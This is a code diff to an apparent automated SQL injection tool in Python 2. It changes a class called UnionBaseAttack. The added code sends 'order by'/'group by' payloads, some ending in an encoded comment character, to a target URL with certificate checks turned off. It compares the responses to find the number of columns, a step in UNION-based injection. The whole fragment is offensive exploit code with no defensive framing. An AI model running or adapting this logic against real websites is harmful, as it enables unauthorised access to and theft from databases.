@@ -30,6 +30,7 @@ class UnionBaseAttack(object):
 
     def __order_by_cmd__(self):
         injected_method = ""
+        end_sharp = ""
 
         def item_error_checker(response):
             return_r = False
@@ -39,10 +40,19 @@ class UnionBaseAttack(object):
                     return_r = True
             return return_r
 
-        def get_columns_number(method):
+        def get_columns_number(method, end_sharp, ):
             for counter in xrange(1, 1000):
                 sleep(1)
-                secondResponse = reqs.get(self.url + method + str)
+                if end_sharp != "":
+                    secondResponse = reqs.get(self.url + method + str(counter),
+                                              headers=define_headerdata, verify=False)
+                else:
+                    secondResponse = reqs.get(self.url + method + str(counter) + " %23",
+                                              headers=define_headerdata, verify=False)
+
+                if secondResponse.content != self.firstResponse.content:
+                    return counter - 1
+
 
         for item in define_order_by_command_php:
             sleep(.5)
@@ -50,7 +60,12 @@ class UnionBaseAttack(object):
             if item_error_checker(secondResponse.content):
                 '''now we can find which command is used for injection'''
                 injected_method = item[0: 10] # it can be ['order by', 'group by']
+                if item[-1] == "3":
+                     end_sharp = "%23"
                 break
 
-        print TextColor.CVIOLET + str("\n Working on count of columns ... please wait until I found them") + TextColor.WHITE
+        print TextColor.CVIOLET + str("\nWorking on count of columns ... please wait untill I found them") + TextColor.WHITE
+
+        print
+        print get_columns_number(injected_method, end_sharp)
 
